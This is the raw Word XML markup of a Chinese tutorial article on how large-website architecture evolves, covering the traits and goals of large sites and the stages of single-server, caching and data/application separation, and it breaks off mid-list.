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9A1ED" w14:textId="768D7765" w:rsidR="007707E5" w:rsidRPr="001423ED" w:rsidRDefault="001423ED" w:rsidP="007707E5">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="F0EEF5"/>
        <w:rPr>
          <w:rStyle w:val="ab"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001423ED">
        <w:rPr>
          <w:rStyle w:val="ab"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>001、</w:t>
      </w:r>
      <w:hyperlink r:id="rId8" w:history="1">
        <w:r w:rsidR="007707E5">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="333333"/>
            <w:sz w:val="42"/>
            <w:szCs w:val="42"/>
          </w:rPr>
          <w:t>一步步带你，如何网站架构</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0B55AA76" w14:textId="77777777" w:rsidR="007707E5" w:rsidRPr="001423ED" w:rsidRDefault="007707E5" w:rsidP="001423ED">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="37"/>
          <w:szCs w:val="37"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001423ED">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="37"/>
          <w:szCs w:val="37"/>
        </w:rPr>
        <w:t>何为大型网站</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70792E88" w14:textId="77777777" w:rsidR="007707E5" w:rsidRPr="001423ED"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sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001423ED">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>大型网站特性</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73FB040D"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既然说的是大型网站架构，那么</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>架构的背后自然是解决人因面对大型网站特性而带来的问题</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>。这样可以先给大家说下大型网站的特性，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>这些特性带来的问题就是人要解决的问题</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FD74F3E" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="107"/>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高并发、大流量：PV 量巨大；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02080CB7" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="107"/>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高可用：7*24 小时不间断服务；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09DC8075" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="107"/>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海量数据：文件数目分分钟 xxTB；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B38AFEB" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="107"/>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用户分布广泛，网络情况复杂：网络运营商；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C1A9AB" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="107"/>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安全环境恶劣：黑客的攻击；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3896F7FD" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="107"/>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需求快速变更，发布频繁：快速适应市场，满足用户需求；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12B469EC" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="107"/>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渐进式发展：慢慢地运营出大型网站；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E504160"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大型网站目标</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57E8D405"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既然说到了大型网站的特性，那么</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>解决这些特性带来的问题要达到什么目标呢？</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A1A9CFC" w14:textId="365A5BE5"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5418D672" wp14:editId="10B49065">
            <wp:extent cx="4956625" cy="325966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2351" cy="3263432"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A0528DF"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大型网站架构目标</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02FDA4C5"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每个目标背后面临着技术、设计、维护等诸多方面的挑战； 而目标本身的期望值也会根据实际情况进行调整，这也意味着网站架构建设是个不断调整的过程。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A6BE0E"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有了问题，也定了伟大的目标，那么网站在不同阶段面对不同的问题，是如何解决的？又是如何一步步成长为大型网站架构，实现这些伟大的目标呢？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32D60A89"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如何网站架构</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585F0661"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首先，什么是大型网站架构呢？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5084A48F"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其实大型网站架构的概念对于每一个开发者来说很笼统、很模糊，正如盲人摸象，看到的、了解到的只是很小的一部分，大部分情况下我们只是负责架构中的一小块内容，所以很难清晰地给出具体定义。这就是所谓“不识庐山真面目 只缘身在此山中”的尴尬吧。所以我们要跳出来，站在宏观的角度，从整体到细节实现来认识大型网站架构。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BA9DC51"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那么从宏观的角度怎么去认识大型网站架构呢？正如前面几篇</w:t>
      </w:r>
      <w:hyperlink r:id="rId10" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
            <w:color w:val="0099CC"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>《细品架构系列》</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>所描述对架构的认识，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>按照问题识别—&gt;概念认知—&gt;架构切分的思路</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>，来分析大型网站架构的诞生：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E75C527" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="108"/>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问题识别：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="5E5E5E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>当前什么问题、谁的问题、问题边界；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="571925B5" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="108"/>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概念认知：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="5E5E5E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>通过分析问题，会产生哪些概念，统一概念认知，达成沟通交流规范；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC887F6" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="108"/>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架构切分：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="5E5E5E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>根据概念来解决问题，如何架构切分，产生哪些架构，提出具体解决方案；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A14E831"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PS：上面的三个步骤具体如何识别、认知、切分，请详细参考前面几篇</w:t>
      </w:r>
      <w:hyperlink r:id="rId11" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="0099CC"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>《细品架构系列》</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="777777"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>文章，可能使你会对架构有重新的认识。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F1C9B83"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在进行分析大型网站架构的演进之路前，首先我们要明确的两个价值观：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57869FDE" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="109"/>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核心价值：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="5E5E5E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>随网站所需灵活应对；大型网站不是从无到有一步就搭建好一个大型网站，而是能够伴随小型网站业务的渐进发展，慢慢地演化成一个大型网站；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62AFF917" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="109"/>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驱动力量：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="5E5E5E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>网站的业务发展—业务成就了技术，事业成就了人，而不是相反；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13F3C159"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还有，大型网站架构演进必须避免的几个误区：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094D2C95" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="110"/>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一味追随大公司的解决方案；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70B3FAE9" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="110"/>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为了技术而技术–&gt;常见问题；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43ADB1FB" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="110"/>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企图用技术解决所有问题：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="5E5E5E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>技术是用来解决业务问题的，而业务的问题，也可以通过业务的手段去解决；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7991D567" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="001423ED">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="39"/>
          <w:szCs w:val="39"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="39"/>
          <w:szCs w:val="39"/>
        </w:rPr>
        <w:t>架构体系演进</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB4CDD8"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单机时代</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3549DA5F"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草根时期，快速开发网站并上线。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>当然，通常只是先试水，用户规模也没有形成，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>经济能力和投入也非常有限</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>应用程序、数据库、文件等所有资源都集中在一台 Server上</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>，典型案例：基于 LAMP 架构的 PHP 网站；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D4B2E7F" w14:textId="7DAD46D9"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57E7C89A" wp14:editId="13380E42">
            <wp:extent cx="8957389" cy="340360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73549" cy="3409740"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7843C2FB"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单机时代（纯依赖RDBMS）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="780DA358"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简单、快速迭代达成业务目标；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="492D0470"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存在单点、谈不上高可用；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A9C1955" w14:textId="3E40709D"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应用设计要保证可扩展；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3184BF5A"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缓存出场</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CADA1A2" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="001423ED">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="40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有一定的业务量和用户规模了，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>想提升网站速度，于是，缓存出场了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C1E97B2" w14:textId="38CF3661"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72079914" wp14:editId="0B481154">
            <wp:extent cx="9106746" cy="471178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33971" cy="4725868"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CAE6B51"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单机时代+缓存出场</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="052382E7"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简单有效、方便维护；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F9D8E52"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存在单点、谈不上高可用；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A57F298" w14:textId="3E618E51"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客户端（浏览器）缓存、前端页面缓存、页面片段缓存、本地数据缓存/数据库缓存、远程缓存；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B0287EA"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如上图，缓存可以分为：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B24D58E" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="111"/>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页面缓存：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="5E5E5E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>客户端缓存，减少对网站的访问；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F216F3E" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="111"/>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本地缓存：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="5E5E5E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>访问速度快，但数据量有限，减少对DB查询；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70B58260" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="111"/>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远程缓存：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="5E5E5E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>远程访问，可以集群，因此容量不受限制；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E578998"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lastRenderedPageBreak/>
        <w:t>数据服务与应用分离</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F467BA2"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市场反响还不错，用户量每天在增长，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>数据库疯狂读写，逐渐发现一台服务器快撑不住了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>。于是，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>决定把数据服务和APP做分离</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="2E2E2E"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E01F9F3" w14:textId="11F3064E"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28888C01" wp14:editId="354778D3">
            <wp:extent cx="6570980" cy="3599180"/>
            <wp:effectExtent l="0" t="0" r="127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0980" cy="3599180"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CDEC21C"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数据服务与应用分离</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63DB147B"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简单有效、方便维护、提高不同Server对硬件资源的利用率；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B425EDC"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存在单点、谈不上高可用；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48C9760D" w14:textId="66AD8E8B"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文件服务器部署、数据库服务器，扩展数据访问模块；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73C2AE4E"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分离后三台 Server 对硬件资源的需求各不相同：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA5E185" w14:textId="77777777" w:rsidR="007707E5" w:rsidRDefault="007707E5" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="112"/>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应用服务器：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
